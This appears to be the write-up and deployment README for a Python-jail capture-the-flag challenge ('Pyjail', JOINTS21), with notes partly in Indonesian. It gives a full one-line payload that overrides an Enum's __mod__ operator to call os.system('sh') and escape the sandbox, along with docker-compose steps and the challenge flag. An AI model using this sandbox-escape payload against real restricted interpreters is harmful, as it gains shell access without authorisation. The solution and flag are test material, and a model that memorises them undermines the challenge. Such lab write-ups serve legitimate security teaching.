## Judul Soal
Pyjail

## Deskripsi Soal

> `nc ip port`

---
## Proof of Concept

- Make use of pre-defined `Enum class` in order to override `__mod__` operator
- Using declared `os` module, simply craft payload like `os.system('sh')`
- Final payload will be like this
    ```
    # os.system(str(bytearray(['s','h'])))
    
    [[A.attr%i for A.__mod__ in [os.system]] for i in [[A.attr%i for A.__mod__ in [str]] for i in [[A.attr%i for A.__mod__ in [bytearray]] for i in [[A.attr%i for A.__mod__ in [chr] for i in [115, 104]]]][0]][0]]
    ```
---

## Catatan deployment

Konfigurasi `docker` ada di directory `server`. Ganti `port` sesuai kebutuhan.


```sh
# Build
$ docker-compose build

# Deploy
$ docker-compose up -d
```

## Flag
JOINTS21{0verride_3num_on_remaind3r_op3rati0n_ftw}
